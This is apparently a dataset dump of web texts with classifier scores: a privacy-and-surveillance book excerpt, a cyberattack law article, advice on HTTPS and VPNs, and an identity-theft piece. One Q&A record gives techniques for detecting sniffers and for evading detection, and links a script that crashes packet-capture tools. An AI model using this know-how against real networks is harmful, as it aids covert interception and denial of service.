prosecutions the contents of what they heard, with no oversight and without the consent of those whose words were monitored. Indeed, in Olmstead v. United States, 277 U.S. 438 (1928), the U.S. Supreme Court held that “the reasonable view is that one who installs in his house a telephone instrument with connecting wires intends to project his voice to those quite outside, and that the wires beyond his house, and messages while passing over them, are not within the protection of the Fourth Amendment. Here those who intercepted the projected voices were not in the house of either party to the conversation.” In so holding, it ruled that “the wire tapping here disclosed [in the case] did not amount to a search or seizure within the meaning of the Fourth Amendment,” and thus that telephone conversations were not protected or privileged in any way over ordinary speech outside the home. There was, in this view, no (rational) expectation of privacy for such conversations (although the term “expectation of privacy” had not yet come into use). This view of telephone conversations lasted until 1967,8 when the Supreme Court ruled that there was, in fact, a constitutional expectation of privacy in the use of the telephone. By this time, operators were hardly ever used for the connection of circuits and were not expected to monitor the quality of phone conversations, nor were most phone lines shared. However, the decision that there was an expectation of privacy in such conversations lagged significantly behind the technological developments that created such an expectation. At this point, the court decided that telephone calls were like physical mail, in which each call had a public “outside” and a private “contents.” The public envelope contained the information necessary to establish the circuit for the call (including the phone from which the call was being made and the phone to which the call was made) but did not include the contents of the call, which was considered private. Gaining legal access to that part of the call required a warrant issued by a judge after a showing of probable cause. The last two decades have seen a novel set of communication technol- 8 Katz v. United States, 389 U.S. 347. OCR for page 292 Engaging Privacy and Information Technology in a Digital Age the information that was used to make the determination. Even Edward Kennedy, senior senator from Massachusetts, has had problems getting his name off the watch list.29 Even if corrective mechanisms were in place, lists such as these suffer from a cluster of problems having to do with establishing the identity of those who are being compared to the list. If a list is kept in terms of names, its usefulness is limited by the fact that a single name can be shared by many different people. A combination of name and address may be better, but falls prey to the ease with which people move from place to place, and the time lag between such a move and the time at which all relevant records have been updated to reflect the new address. Indeed, such lists seem to presume, contrary to fact, that there is a way (or set of ways) to uniquely identify each person who might appear on such a list. There is no such mechanism available today, and establishing such a mechanism is far from simple.30 9.2.5 Tensions Between Privacy and National Security In many ways, the tension between privacy and national security parallels the tension between privacy and law enforcement. Both law enforcement and national security require government to amass large amounts of information about people, including much information that the subject or target might want to keep private and information that will ultimately not prove useful for any mission-related function. Both law enforcement and national security require that that information be analyzed to try to infer even more about a person. Both are heavy users of technology, and both use technology to gather information, identify individuals, and analyze that information. National security differs from law enforcement, however, in two significant ways. First, law enforcement authorities are usually (though not always) called in when a criminal act has been committed, and the criminal act itself serves to focus investigative resources—that is, they tend to be reactive. National security authorities are most interested in preventing hostile acts from taking place—they tend to be proactive. Second, most of the information gathered by law enforcement and used to prosecute a person for the violation of a law will eventually be made public, along with the mechanisms used to gather that information. Intelligence gathering 29 Rachel L. Swarns, “Senator? Terrorist? A Watch List Stops Kennedy at Airport,” New York Times, August 20, 2004. 30 See National Research Council, Who Goes There? Authentication Through the Lens of Privacy, Stephen T. Kent and Lynette I. Millett, eds., The National Academies Press, Washington, D.C., 2003. OCR for page 293 Engaging Privacy and Information Technology in a Digital Age for the purposes of national security, on the other hand, is an intrinsically non-public activity. The mechanisms used to gather information, along with the information itself, are not made public, even when the information is used in a way that has an impact on the life of the subject of that information. This greater need for secrecy makes it unlikely that citizens will be able to discover if the agencies charged with national security are violating their privacy. The mechanisms for gathering information are often unknown, so those wishing to ensure privacy may not know the techniques against which they must guard. The information gathered must remain secret, and so there is no easy way to know what information is gathered, if that information is accurate, whether it might be subject to different interpretations, or how to correct the information if it is inaccurate or incomplete. The only thing known with certainty is that there is an entity that is capable of gathering information about foreign governments, and it is reasonable to presume that such an entity can easily gather information about private citizens in the United States. Because of the secret nature of the information gathered by national security agencies, it can be difficult to establish a trust relationship if one does not already exist between the citizens about whom the information is gathered and the agencies doing the gathering. There are few in the United States who would worry about the gathering of information even within the borders of the United States and about U.S. citizens if they could be assured that such information was only being used for genuine national security purposes, and that any information that had been gathered about them was accurate and appropriately interpreted and treated. How to obtain that assurance is a public policy issue of the utmost importance. This is why oversight is so important, all the more so in times of crisis. Accountability need not mean indiscriminate transparency; rather, trusted agents such as members of Congress or special commissions should be entrusted with offering, and hopefully can be trusted to offer, needed assurances. 9.3 LAW ENFORCEMENT, NATIONAL SECURITY, AND INDIVIDUAL PRIVACY Even before the formation of our nation, government was seen as posing the principal threats to individual privacy. Many of the grievances against the English crown that were detailed in the Declaration of Independence reflected an erosion of the right to be left alone, and many provisions of the Bill of Rights sought to codify limitations on government power which the framers saw as vital to the new nation. While the Constitution nowhere expressly recognizes a “right to privacy,” several OCR for page 294 Engaging Privacy and Information Technology in a Digital Age provisions (especially, but not only, the Fourth Amendment) unmistakably limit the power of government to invade the lives of citizens. When law enforcement and national security are concerned, the sources of concern about privacy rights are readily apparent. On the one hand, law enforcement must be able to gather information about individuals in order to identify and apprehend suspects and to enforce criminal law and regulatory standards. National security agencies gather and analyze information about individuals and organizations in order to protect and enhance national security. On the other hand, the very process of gathering and using such information may pose serious risks to individual privacy. A somewhat similar set of tensions apply to data that have already been collected for some purpose other than law enforcement or national security. As noted in earlier chapters, a wide variety of personal information on individuals is collected for a wide variety of purposes by both government agencies (e.g., the Internal Revenue Service, the Census Bureau) and private sector organizations such as banks, schools, phone companies, and providers of medical care. In some instances (such as survey data collected by the Census Bureau), such information has been collected under a promise, legal or otherwise, that it would be used for a certain purpose and only for that purpose, and would otherwise be kept confidential.31 If and when external circumstances change (e.g., the nation comes under attack), some would argue strongly that it is criminal to refrain from using all resources available to the government to pursue its law enforcement and national security responsibilities. Others would argue just as strongly that the legal restrictions in effect at the time of data collection effectively render such data unavailable to the government, legally if not physically. According to scholars William Seltzer and Margo Anderson,32 an example of such government use of privileged data occurred during World War II, when the Bureau of the Census assisted U.S. law enforcement authorities in carrying out the presidentially ordered internment 31 One exception is that the USA PATRIOT Act of 2001 allows the attorney general to obtain a court order directing the Department of Education to provide to the Department of Justice data collected by the National Center for Education Statistics (NCES) if such data are relevant to an authorized investigation or prosecution of an offense concerning national or international terrorism. However, the law also requires the attorney general to protect the confidentiality of the data, although the standards used for such protection are formulated by the attorney general “in consultation with” the Department of Education. Prior to the passage of the USA PATRIOT Act, NCES data were to be used only for statistical purposes. 32 William Seltzer and Margo Anderson, “After Pearl Harbor: The Proper Role of Population Data Systems in Time of War,” paper presented at the annual meeting of the Population Association of America, Los Angeles, California, March 2000, available at the American Statistical Association’s Statisticians in History Web site. OCR for page 295 Engaging Privacy and Information Technology in a Digital Age of Japanese-Americans. In a meeting of the Census Advisory Committee held in January 1942, J.C. Capt, director of the census, was reported to say, “We’re by law required to keep confidential information by [sic] individuals. But in the end, [i]f the defense authorities found 200 Japs missing and they wanted the names of the Japs in that area, I would give them further means of checking individuals.” It is not known if the Census Bureau actually provided information on individual Japanese-Americans, but Seltzer and Anderson cite documents indicating that the Census Bureau clearly did provide mesodata (i.e., census results tabulated for very small geographic units, some as small as a city block) that did facilitate the internment process. Indeed, on the Monday after the December 7 attack on Pearl Harbor (which occurred on a Sunday), the Census Bureau initiated the production of reports on the distribution of Japanese-Americans across the United States based on macrodata (data from the 1940 census aggregated in terms of large geographic units). Seltzer and Anderson note also that the Census Bureau has recognized possible threats to privacy arising from certain kinds of mesodata, and in response has progressively introduced stricter disclosure standards. Indeed, the bureau has indicated that under the standards now in place the release of mesodata from the 1940 census on Japanese-Americans would have been severely restricted. A number of points are worth noting about this example. First, whether or not the Census Bureau provided information on individuals, the use of census data violated the spirit of the confidentiality law in the sense that respondents provided information under promises of confidentiality33—information that was subsequently used against them. Second, Capt’s remarks suggest a willingness to exploit legal loopholes in order to cooperate with the internment order. Third, even if the actual wording of the confidentiality promise made a “fine print” provision for “other legally authorized uses,” it would still have left survey respondents with the impression that their responses were confidential. 33 For example, President Herbert Hoover’s proclamation in 1929 for the 15th census said that “the sole purpose of the census is to secure general statistical information regarding the population and resources of the country…. No person can be harmed in any way by providing the information required. The census has nothing to do with … the enforcement of any national, state, or local law or ordinance. There need be no fear that any disclosure will be made regarding any individual person or his affairs….” In addition, the 1940 census enumeration form itself said that “only sworn census employees will see your statements. Data collected will be used solely for preparing statistical information concerning the Nation’s population, resources, and business activities. Your Census Reports Cannot Be Used for Purposes of Taxation, Regulation, or Investigation” [capitalization in the original]. See Thomas F. Corcoran, “On the Confidential Status of Census Reports,” The American Statistician 17(3):33-40, 1963. OCR for page 296 Engaging Privacy and Information Technology in a Digital Age Issues related to privacy in a law enforcement or national security context are hard for citizens to assess. Citizens are not told what information these agencies are capable of gathering or what they do gather, because that knowledge being made public can limit the very information that agencies will be able to gather. In addition, the stakes are higher because these agencies can use information they gathered to imprison citizens. Citizens are asked to trust that abuses are not occurring and to trust in the oversight mechanisms that often require one part of the government to ensure that another is not generally overstepping appropriate bounds. Similarly, law enforcement and national security agencies are put into a difficult position regarding the gathering and analysis of information. If these agencies fail to gather enough information to accomplish their missions, they are faulted for not using the latest techniques and technologies. However, if these agencies are perceived as gathering too much information about ordinary citizens, they are faulted for invasion of privacy. Unfortunately, it is often impossible to determine, before the fact, who is going to be a law breaker or terrorist in the future. There is no way for law enforcement and national security agencies to determine about whom they should gather information without requiring that these agencies also know the future. The conundrum is further accentuated by a declaratory national policy that emphasizes prevention of terrorist attacks rather than prosecution or retaliation after they occur. That is, law enforcement activities must take place—successfully—in the absence of the primary event that usually focuses such activities. With few definitively related clues to guide an investigation, a much more uniform spread of attention must be cast over those who might have some contact or connection, however tenuous, to a possible terrorist event in the future. The best that can be expected is that these agencies put into place the appropriate safeguards, checks, and balances to minimize the possibility that they gather information in an inappropriate way about citizens. But the more such safeguards are in place, so the argument goes, the more likely it is that mistakes are made in the opposite direction, and that these agencies will miss some piece of information that is vital for the performance of their function. Yet areas of overlap between privacy and law enforcement and national security also exist. For example, citizens who have faith in their government and who believe that it generally follows democratic rules (one reflection of which is respect for privacy) will be more likely to cooperate with law enforcement in providing information and other forms of support. In that sense, just as it is sometimes said that privacy is a good business practice, it might also be said that a law enforcement agency’s respect for a citizen’s privacy, rather than necessarily being in opposition to, can be supportive of law enforcement goals. OCR for page 297 Engaging Privacy and Information Technology in a Digital Age An important influence on the process of balancing governmental and societal needs for safety and security and individual privacy is the fact that public safety is—almost by definition—a collective benefit, while government infringements of privacy in the name of public safety tend to affect individuals or relatively small or politically marginal groups of people, at least in the short term. Under such circumstances, it is easier for public safety officials to dismiss or minimize privacy concerns that their actions might raise. As an illustration of the sentiment, Harvard Law School Professor William Stuntz has asserted that “reasonable people can differ about the balance, but one could plausibly conclude that the efficiency gains from profiling outweigh the harm from the ethnic tax that post-September 11 policing is imposing on young men of Middle Eastern origin.”34 The flip side of this sentiment, of course, is that community involvement and good will may well be an essential element, perhaps the most important element, of a strategy that seeks to counter terrorists concealing themselves in the nation’s communities. That is, tips about unusual and suspicious behavior are most likely to emerge when the communities in which terrorists are embedded are allied with, or at least not suspicious of, law enforcement authorities—and singling out young men of Middle Eastern origin for special scrutiny is not an approach that will create a large amount of good will in the affected communities. These tensions have been magnified since the terrorist attacks of September 11. There are many who feel that if the right information had been available, along with the right tools to analyze that information and the right governmental structures that would allow the sharing of the information between law enforcement and national security agencies, those attacks could have been avoided. Part of the reaction to those attacks was the passing of laws and the creation of policies that made it easier for agencies to collect and share information and the weakening of some traditional checks and balances in the hope of enhancing national security. At the same time, there is worry that the increasingly sophisticated technology available for surveillance, data sharing and analysis, and data warehousing, when joined with the weakening of rules protecting individual information, will allow law enforcement and national security agencies a vastly expanded and largely unseen ability to monitor all citizens. The potential for abuse given such an ability is easy to imagine—for example, a law enforcement agency might be able to monitor the group gatherings of citizens objecting to a certain government policy, identifying who they meet with and perhaps what they talk about. Most citizens do not know what is technically possible, either now or in the near future. Because of this, there is often a tendency to believe that the technology 34 See William Stuntz, “Local Policing After the Terror,” Yale Law Journal 111:2137, 2002. OCR for page 298 Engaging Privacy and Information Technology in a Digital Age is capable of far more than it can actually do, either currently or in the foreseeable future. The problem may not be in what these government agencies are capable of doing with technology, but rather with what the citizens believe those agencies can do. These comments should not be taken to suggest that policy makers in government agencies are unaware of privacy interests. For example, under the E-Government Act of 2002, any federal agency contemplating a substantially revised or new information technology system is required to develop a privacy impact assessment (PIA; Box 9.5) for such a system before work on that system begins in earnest. In the case of the Department of Homeland Security (DHS), DHS officials indicate that findings of PIAs are, to some extent, folded into the requirements development process in an attempt to ensure that the program or system, when deployed, is at least sensitive to privacy considerations. (It should also be noted that DHS officials reject the paradigm that privacy trades off against security; they assert that the challenge is enhancing security while protecting privacy.) Nevertheless, the concern from the privacy advocates remains regarding the extent to which privacy considerations are taken into account, and the specific nature of the privacy-driven system or program adaptations. BOX 9.5 The Department of Homeland Security Privacy Impact Assessment A privacy impact assessment (PIA) is an analysis of how personally identifiable information is collected, stored, protected, shared, and managed. “Personally identifiable information” is defined as information in a system or online collection that directly or indirectly identifies an individual whether the individual is a U.S. citizen, legal permanent resident, or a visitor to the United States. The purpose of a PIA is to demonstrate that system owners and developers have consciously incorporated privacy protections throughout the entire life cycle of a system. This involves making certain that privacy protections are built into the system from the start, not after the fact when they can be far more costly or could affect the viability of the project. Personally identifiable information is information in a system, online collection, or technology (1) that directly identifies an individual (e.g., name, date of birth, mailing address, telephone number, Social Security number, e-mail address, zip code, address, account numbers, certificate and license numbers, vehicle identifiers including license plates, uniform resource locators, Internet Protocol addresses, biometric identifiers, photographic facial images, or any other unique identifying number or characteristic), or (2) by which an agency intends to identify specific individuals in conjunction with other data elements, that is, indirect identification. These data elements may include OCR for page 299 Engaging Privacy and Information Technology in a Digital Age Finally, the discussion in this chapter raises the question of what must be done when law enforcement authorities or intelligence agencies invade the privacy of Americans who are law-abiding or who pose no threat to national security. It is unrealistic to expect that the number of false positives (i.e., the number of people improperly implicated) can be reduced to zero, and thus public policy must necessarily anticipate that some such cases will arise. One option is to minimize the number of false positives, and in the event of a false positive, the person improperly implicated simply absorbs the cost and consequences of the false positive (e.g., loss of privacy and any consequential costs, such as personal embarrassment, financial loss, and so on) on behalf of the rest of society. But these costs and consequences can be dire indeed, and at least in principle our society has generally adopted the principle that individuals suffering the consequences of improper or mistaken government behavior are entitled to some kind of compensation. Providing recourse for citizens improperly treated by government authorities is generally thought to make government authorities more careful and more respectful of rights than they might otherwise be. a combination of gender, race, birth date, geographic indicator, and any information that reasonably can be foreseen as being linked with other information to identify an individual. In some cases the technology might only collect personal information for a moment. For example, a body-screening device might capture the full scan of an individual, and even if the information was not retained for later use, the initial scan might raise privacy concerns, and thus the development and deployment of the technology would require a PIA. Questions asked by the PIA include the following: Section 1.0 Information collected and maintained 1.1 What information is to be collected? 1.2 From whom is information collected? 1.3 Why is the information being collected? 1.4 What specific legal authorities, arrangements, or agreements define the collection of information? 1.5 Privacy Impact Analysis: Given the amount and type of data being collected, discuss what privacy risks were identified and how they were mitigated. Section 2.0 Uses of the system and the information 2.1 Describe all the uses of information. 2.2 Does the system analyze data to assist users in identifying previously un OCR for page 300 OCR for page 301 Engaging Privacy and Information Technology in a Digital Age 6.3 Do individuals have the right to consent to particular uses of the information, and if so, how does the individual exercise the right? 6.4 Privacy Impact Analysis: Given the notice provided to individuals above, describe what privacy risks were identified and how they were mitigated. Section 7.0 Individual access, redress and correction 7.1 What are the procedures that allow individuals to gain access to their own information? 7.2 What are the procedures for correcting erroneous information? 7.3 How are individuals notified of the procedures for correcting their information? 7.4 If no redress is provided, are alternatives available? 7.5 Privacy Impact Analysis: Given the access and other procedural rights provided for in the Privacy Act of 1974, explain the procedural rights that are provided and, if access, correction, and redress rights are not provided, explain why not. Section 8.0 Technical access and security 8.1 Which user group(s) will have access to the system? 8.2 Will contractors to DHS have access to the system? If so, please submit to the Privacy Office with this PIA a copy of the contract describing their role. 8.3 Does the system use “roles” to assign privileges to users of the system? 8.4 What procedures are in place to determine which users may access the system, and are they documented? 8.5 How are the actual assignments of roles and rules verified according to established security and auditing procedures? 8.6 What auditing measures and technical safeguards are in place to prevent misuse of data? 8.7 Describe what privacy training is provided to users either generally or that is specifically relevant to the functionality of the program or system. 8.8 Are the data secured in accordance with FISMA requirements? If yes, when were certification and accreditation last completed? 8.9 Privacy Impact Analysis: Given access and security controls, describe what privacy risks were identified and how they were mitigated. Section 9.0 Technology 9.1 Was the system built from the ground up or purchased and installed? 9.2 Describe how data integrity, privacy, and security were analyzed as part of the decisions made for your system. 9.3 What design choices were made to enhance privacy? SOURCE: Department of Homeland Security, Privacy Impact Assessments: Official Guidance, DHS Privacy Office, available at http://www.dhs.gov/interWeb/assetlibrary/privacy_pia_guidance_march_v5.pdf. OCR for page 302 Engaging Privacy and Information Technology in a Digital Age This page intentionally left blank. Representative terms from entire chapter:",
        "prob": "tensor([[0.0169, 0.9831]])"
    },
    {
        "text": "Technology: Beware the Cyberattacker |by Ronald N. Weikers and Kevin P. Cronin Winter 2003, Vol. 65, No. 4 Trespass and burglary used to involve purely physical acts, such as rattling doorknobs, lifting windows and leaving a home bare of valuables. Today, however, our increasingly networked world offers an entirely new landscape for these old crimes. The tools of crime, too, have changed: culprits now use \"port sweeps,\" wireless \"wardriving\" and electronic \"snooping\" and \"sniffing\" to detect vulnerable computer systems over the Internet or through the airwaves, often leaving no clues. Although data, the target of these intrusions, is intangible, the perceptible damage hackers can cause to security and privacy is of a magnitude unthinkable just a few years ago. To combat this problem, companiesand, to a lesser degree, individualshave begun to use a variety of technical safeguards. Lawmakers, too, are concerned about security and privacy issues and have enacted several major data security and privacy laws and regulations in recent years. Technology's Hidden Cost Although \"cybersecurity\" can significantly hike the expense of installing and maintaining computer systems, the cost of ignoring security and privacy vulnerabilities may be much higher. Cyberattacksoften using \"malware,\" malicious software, such as worms and virusescause billions of dollars in damage each year. U.S. businesses have spent an estimated $40 billion in remediating cyberattacks in just the past three years. Historically, government agencies were the most common targets of hacking, but today corporations are becoming more frequent victims. The following is a sampling of cyberattacks that have occurred during the past decade: - 1994 New York: Russian computer expert, using a personal computer and stolen passwords and IDs, penetrated Citibank's cash management system and illegally transferred more than $10 million to bank accounts in California, Finland, Germany, the Netherlands, Switzerland and Israel. - 1996 Connecticut: After being laid off, a former network administrator wrote six lines of software that destroyed his employer's manufacturing system programs. The event led to more than $10 million in losses and $2 million in reprogramming costs, and ultimately caused eighty layoffs. - 1996 Nationwide: Hackers tapped into WebCom, a large Internet service provider, wiping out more than 3,000 sites for forty hours. Many of the sites were those of retailers trying to capitalize on the Christmas rush. - 1999 Worldwide: The \"Melissa\" virus was the first virus to spread by e-mail through Outlook address books, causing an estimated $1.2 billion in damage. - 2000 Nationwide: The first \"Distributed Denial of Service\" (DDoS) attacks were launched, shutting down major commercial Web sites, including Yahoo!, Amazon.com, CNN and e-Bay, and causing more than $1 billion in damage. - 2000 Worldwide: The \"Love Bug\" worm spread faster than any worm in history, causing an estimated $8.7 billion in damage to forty million computers. - 2001 Worldwide: The \"Code Red\" worm infected more than 250,000 servers within hours of its activation. - 2002 Worldwide: The \"Klez\" and \"Bug-bear\" worms broke through anti-virus protections, gathering data from hard drives and logging users' keystrokes. - 2002 Worldwide: In October, unknown hackers launched a massive DDoS attack against the Internet's thirteen domain name root serverswhich are critical for directing data flow between other Internet serverscausing nine to crash and the Internet to slow down throughout the world. These attacks may prophesy more numerous and more damaging attacks in the future. The federal government and all fifty states have enacted criminal and civil legislation prohibiting unauthorized access, malware distribution, DDoS attacks and other forms of hacking. These laws generally cast traditional legal concepts, such as trespass and conversion, in terms of modern technology. Also, a number of statutes and regulations require companies to implement preventive security and privacy measures, particularly in the financial and health care industries, such as the Gramm-Leach-Bliley Act (GLBA) and the Health Insurance Portability and Accountability Act (HIPAA), which regulate personal data. Federal Security Laws The Computer Fraud and Abuse Act (CFAA) is the broadest tool for combating computer crime. The CFAA imposes criminal penalties on hackers who improperly access, improperly attempt to access, or damage computers. The 1996 amendments expanded the scope of the CFAA to cover \"protected computers\" used in interstate commerce, which include virtually any computer connected to the Internet. Fines may be levied against violators, and the 2001 amendments under the USA Patriot Act impose prison sentences of up to twenty years. The Electronic Communications Privacy Act (ECPA) expands coverage of the Federal Wiretap Statutes by prohibiting interception of wire and electronic communications, and prohibiting unauthorized alteration or access, or preventing access, to wire or electronic communications while in electronic storage. One of the primary purposes of the ECPA was to extend to electronic communications the same protection against unauthorized interceptions that wiretap laws had been providing for oral and wire communications via common carrier transmissions. In addition to criminal sanctions, the ECPA provides a private cause of action, with minimum statutory damages of $1,000 per violation. A variety of other federal laws prohibit behavior related to hacking. These statutes include the Federal Wire Fraud Statutes, the No Electronic Theft Act, the National Stolen Property Act, the Economic Espionage Act, the Computer Security Act, the Copyright Act, the Lanham Act and the Digital Millennium Copyright Act. State Security Laws Reflecting this federal push for increased security legislation, all fifty states have enacted some form of legislation that prohibits unauthorized access or interruption of a computer system, as well as theft, destruction, copying, examination, use or misuse of data. Depending on the damage caused, the degree of mens rea and the means utilized in committing the crime, penalties may include fines of tens of thousands of dollars and decades of imprisonment. In Pennsylvania, hackers face up to seven years' imprisonment and $15,000 in fines for intentionally spreading viruses or unlawfully accessing or damaging computer systems or data. New Jersey, New York and Delaware hackers face similarly harsh penalties. Because technical measures are not perfectly effective against cyberattacks, it is likely that criminal penalties will begin to have a deterrent effect once prosecutions become publicized. Hackers typically act independently of any organization that authorizes, or can afford to compensate victims of, their conduct. There have been several documented instances of institutional hacking, but those are rare exceptions to the rule. Thus, if hackers can be found, they are usually judgment proof. As such, in the future it is highly likely that victims of cyberattacks will seek compensation from corporations that are lax in their security measures, enabling hackers to launch attacks from their vulnerable systems, even if the defendants are victims themselves. Plaintiffs will proceed under traditional negligence concepts, arguing that companies have a duty to protect themselves and others from hacking, given that security technology is prevalent and inexpensive relative to the damage that can result. In other words, \"upstream\" victims have a duty to protect \"downstream\" victims based on a reasonableness standard, or based on standards set by new security and privacy rules and regulations, such as GLBA and HIPAA. Plaintiffs may also assert various contract theories where the parties are engaged in business together. They may also allege that owners of servers connected to the Internet implicitly agree to provide a certain level of security. At least one such complaint has already been filed. Apparently, one Web hosting company's negligent security enabled a hacker to use its server as a platform to launch a DDoS attack against another Web hosting company, taking 90,000 Web sites offline in the process. The case settled prior to trial. If a deep pocket cannot be found, victims will seek first-party coverage from insurers for damage to their own systems. Upstream victims may also seek coverage under their third-party liability policies for damage to downstream victims. Current property policies generally exclude damage to computer systems and data losses. Where cyberattacks are not specifically excluded, courts have almost uniformly held that losses of data and software are not covered by property policies, because they are not \"tangible\" losses. A number of insurers do offer e-commerce or Internet insurance for precisely these types of claims. Premiums, however, have recently skyrocketed, and insurers are becoming so savvy that they are charging even higher premiums for those types of systems that they deem to be more vulnerable, based on statistical analyses of intrusions. While cyberattacks and digital privacy intrusions can be analogized to more traditional civil and criminal law violations, the technology they employ is totally new, making their perpetrators more elusive, and the damage they cause often more widespread. As we become more dependent upon data and networks to operate our businesses, government, national defense and other critical functions, the risks posed by hacking, malware and cyberattacks escalate. As such, practitioners must inform themselves about data security and privacy compliance, and about remedies for cyberattacks.",
        "prob": "tensor([[2.1244e-06, 1.0000e+00]])"
    },
    {
        "text": "I think you're looking in the wrong direction. There are two aspects to consider: the security of your laptop, and the security of your connections. For the security of your connections, what matters is that you are using SSL (or TLS — treat it as a synonym of SSL) with a correct certificate. An HTTPS connection means HTTP (the usual web protocol) over SSL. SSL provides end-to-end confidentiality and integrity protection, so it doesn't matter whether you are browsing from a “secure” network or from a public wifi hotspot. What does “correct certificate” mean? A certificate is a website's “identity card”, providing a cryptographic means for your browser to verify that the website is who it claims to be. If the certificate verification didn't happen, you would have no way to know whether the SSL connection was going to the legitimate website or to a man-in-the-middle. In a good first approximation, you need to check three things to know that you have a secure connection to the desired website: - The URL must begin with https://, and browsers will typically show a padlock icon next to the URL. - If you see any scary warning, the connection is not secure. (A scary warning could be due to server misconfiguration too, and this is unfortunately more common than it should be. But if you see a scary warning when attempting to connect to your bank, I don't advise bypassing the warning.) - You must be connecting to the right URL in the first place. This means you should always connect to your bank from a bookmark, not by typing the URL (risk of typo) and never ever by clicking in an email or web link that you're not 200% sure comes from the bank (42nd National Bank is probably not a legitimate site). A VPN doesn't add much security over an HTTPS connection. A VPN protects the connection from your laptop to the VPN endpoint, which includes the point at which attacks are most likely (the local network where your laptop is plugged into or the wifi hotspot that it's connected to), but HTTPS provides end-to-end confidentiality and integrity anyway. VPNs have their uses, but they're esentially irrelevant for web banking: - An enterprise VPN connects your laptop to your enterprise network. The main point is to make securing the enterprise network a lot easier: anyone trying to connect to a server on the enterprise network must have passed some form of authentication already, either physically on the premises or logically by possessing the VPN key/password. - A VPN can provide a bit of privacy at the location where your laptop is connecting from: anyone snooping there will only see your VPN traffic as a whole, instead of individual connections which are undecipherable (if using SSL correctly) but whose endpoint is clearly identified. - A VPN can let you connect to sites that are blocked by an enterprise, ISP or government firewall, as long as those sites are visible from the VPN endpoint. As far as securing a connection from your laptop is concerned, WEP and WPA(2) are completely irrelevant. They are technologies for securing a wifi access point; a laptop connecting to that access point doesn't benefit from them in any useful fashion. IPsec, SSL/TLS, SSH can be technologies underlying a secure connection such as a VPN, but they're not really relevant at your level. They compete on ease of set up, possibility of piercing through firewalls, performance, but not on security. DNSSEC today isn't widely deployed. Until then, assume that DNS is insecure, and rely on SSL to tell you whether you're connecting to the right site. Connection hijacking could happen at the IP level anyway. Finally, none of these are relevant to securing your computer against external or internal attacks. For external attacks tried by someone on the local network, what matters is not what protocols you actively use but what protocols you have open on your machine. The defense is not to run services that you don't use, to have sane firewall settings (most laptops don't need to accept any form of incoming connection) and to keep your operating system and applications up to date. The biggest attack vector nowadays is through content that you have retrieved, e.g. a web page that attempts to exploit a bug in your web browser. The defense against these is not to download risky files such as executable, to avoid browsing dodgy sites or clicking on links in suspicious emails, and to keep your operating system and applications up to date.",
        "prob": "tensor([[2.0599e-06, 1.0000e+00]])"
    },
    {
        "text": "How to find out that a NIC is in promiscuous mode on a LAN? DNS test - many packet sniffing tools perform IP address to name lookups to provide DNS names in place of IP addresses. To test this, you must place your network card into promiscuous mode and sends packets out onto the network aimed to bogus hosts. If any name lookups from the bogus hosts are seen, a sniffer might be in action on the host performing the lookups. ARP Test - When in promiscuous mode the driver for the network card checks for the MAC address being that of the network card for unicast packets, but only checks the first octet of the MAC address against the value 0xff to determine if the packet is broadcast or not. Note that the address for a broadcast packet is ff:ff:ff:ff:ff:ff. To test for this flaw, if you send a packet with a MAC address of ff:00:00:00:00:00 and the correct destination IP address of the host. After receiving a packet, the Microsoft OS using the flawed driver will respond while in promiscuous mode. Probably it happens just with the default MS driver. Ether Ping test - In older Linux kernels when a network card is placed in promiscuous mode every packet is passed on to the OS. Some Linux kernels looked only at the IP address in the packets to determine whether they should be processed or not. To test for this flaw, you have to send a packet with a bogus MAC address and a valid IP address. Vulnerable Linux kernels with their network cards in promiscuous mode only look at the valid IP address. To get a response, an ICMP echo request message is sent within the bogus packet leading to vulnerable hosts in promiscuous mode to respond. Maybe there are more, the DNS test for me is the most reliable VP01 gave the theory, I will give some tools. For use in linux systems: SniffDet: This one employs 4 different tests: ICMP test, ARP test; DNS test and also a LATENCY test (which VP01 didn't mention). The tool is recently updated and I recommend it. NMAP : There is an NSE script for nmap called sniffer-detect.nse which does just that. NAST: - it detects other PC's in promiscuous mode by doing the ARP test. PTOOL - does ARP and ICMP test For windows systems: Cain & Abel can do a promiscuous scan using many types of ARP tests. Microsoft has tools for this purpose too. Promqry and PromqryUI - but I'm not really sure how they work. As for general detection techniques, there's also another one, called honeypot detect. Details about the latency test and the honeypot technique can be found in sniffdet's documentation. You can't guarantee that you'll be able to detect it. For example, you can easily make a read-only ethernet cable by looping the TX+ (pin 1) and TX- (pin 2) of the sniffing computer, then set TX+ (pin 1) to RX+ (pin 3 of the sniffer) and TX- (pin 2) to RX- (pin 6 of the sniffer). It will then be impossible for the sniffing computer to affect any data traffic on the network. It may be possible to detect a voltage drop or RF emissions (along the lines of Van Eck phreaking), but I'm not aware of any COTS hardware that will detect it. While it may not always be possible to identify if the local network is promiscuously sniffing the local network traffic -- it may be possible to crash most or all packet capture applications doing so. Check out Samy's http://samy.pl/killmon.pl script for a starting point. Realize that most applications working in 2011 are vulnerable to at least a DoS crash attack, even if the crash isn't vulnerable as a memory access violation (or a read/write exception that leads to a buffer overflow). I believe there is a tool that reliably detects this by looking at the difference in ping response times. The tool sends pings and at the same time send a large number of pings to the same IP address but with a different MAC addresses. The tool works because cards in promiscuous mode will be returning all traffic to the CPU thus when there is a lot of packets hitting the CPU this will slow the response to genuine pings. A card in normal mode would be ignoring all packets with different MAC addresses so there would be no difference in the response time. Someone insert the name of the tool",
        "prob": "tensor([[7.7065e-05, 9.9992e-01]])"
    },
    {
        "text": "Responding to the growing threat of identity theft. Identity theft is the fastest-growing crime in the world, and while it is commonly thought of as a mostly petty crime involving stolen personal credit cards or social security numbers, it is now becoming a larger threat to governments and corporations. Multiple Web sites offering fake driver’s licenses and social security cards for as little as $75, paired with identity theft’s increased ties to organized crime, have made it a vital homeland security issue. According to Ali M. AlKhouri, a final-year doctoral researcher at the University of Warwick and a senior government official in the United Arab Emirates, and Jay Bal, an associate professor, principal research fellow in the International Manufacturing Centre and director of the InterLean Ebusiness Centre at the University of Warwick, an increasing emphasis on e-commerce and e-government means that organizations are under major threat to not only protect their customers but their own sensitive and proprietary data. In a 2007 working paper, Digital Identities and the Promise of the Technology Trio: PKI, Smart Cards, and Biometrics, AlKhouri and Bal examine three existing technologies and introduce a framework for how they can be combined into a comprehensive security system. The first of these, biometrics, is the use of an iris scan or physical traits, such as fingerprints, voice, hand or face geometry, to identify an individual positively. The second, smart cards, features integrated chips that store and process data, and they can come with a variety of accessories, including magnetic strips, bar codes, optical strips and holograms. Finally, public key infrastructure is a framework for creating a secure method of exchanging information data through encryption. In a PKI environment, a pair of keys — a public key that is known by the user and a private key used only by the system itself — are employed so data encrypted with one key can be decrypted only with the other complementary key and vice versa. At least one of these three systems is 